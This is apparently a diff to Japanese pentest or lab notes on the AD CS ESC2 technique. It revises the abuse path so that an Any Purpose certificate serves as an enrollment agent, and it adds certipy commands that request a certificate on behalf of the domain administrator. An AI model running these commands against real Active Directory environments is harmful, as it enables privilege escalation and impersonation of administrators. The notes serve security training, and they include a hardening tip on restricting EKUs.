@@ -11,22 +11,26 @@ summary: テンプレートの EKU が Any Purpose になっていると、ク�
 
 証明書の EKU（Extended Key Usage、拡張キー使用法）は、その証明書が「クライアント認証用」「コード署名用」など、どの用途に使えるかを制限するフィールド。ESC2 は、テンプレートの EKU が Any Purpose（あらゆる用途に使える）に設定されている場合に成立する。
 
-本来はクライアント認証の EKU を持たないテンプレートであっても、EKU が Any Purpose であれば、発行された証明書をクライアント認証（PKINIT）に流用できてしまう。これにより、ESC1 と同様の悪用（SAN 指定による他ユーザーへのなりすまし）につながることがある。
+本来はクライアント認証の EKU を持たないテンプレートであっても、EKU が Any Purpose であれば、発行された証明書をクライアント認証（PKINIT）に流用できてしまう。さらに Any Purpose は Certificate Request Agent の用途も含むため、発行された証明書を登録代理（ESC3 と同じ）に使い、他のユーザーの代わりに証明書を発行させられる。
 
 ## 手順
 
 1. テンプレートの EKU が Any Purpose になっているものを探す。
 2. そのテンプレートに対して証明書要求を送る。
-3. 発行された証明書を、クライアント認証を含む任意の用途に流用する。
+3. 発行された証明書を登録代理として使い、管理者の代わりに証明書を要求する（以降は ESC3 と同じ）。
 
 ## コマンド
 
 ```
-certipy req -u user@corp.local -p 'Password123' -ca 'CORP-CA' \
+# 1. Any Purpose の証明書を取得
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' \
   -target <CA_HOST> -template 'AnyPurposeTemplate'
+# 2. その証明書を登録代理として使い、管理者用の証明書を発行
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -target <CA_HOST> \
+  -template 'User' -on-behalf-of 'lab\administrator' -pfx user.pfx
 ```
 
 ## 注意点
 
 - EKU が Any Purpose、あるいは EKU が一切指定されていない（Any Purpose とほぼ同義に扱われる）テンプレートは、意図せずクライアント認証用途に使われるリスクがあるため、必要な EKU だけに絞って設定する。
-- ESC1 と組み合わせて、SAN をクライアントが指定できる設定も重なっていると、さらに悪用しやすくなる。
+- テンプレートが SAN のクライアント指定も許可していれば、ESC1 と同じ要領で直接なりすますこともできる。
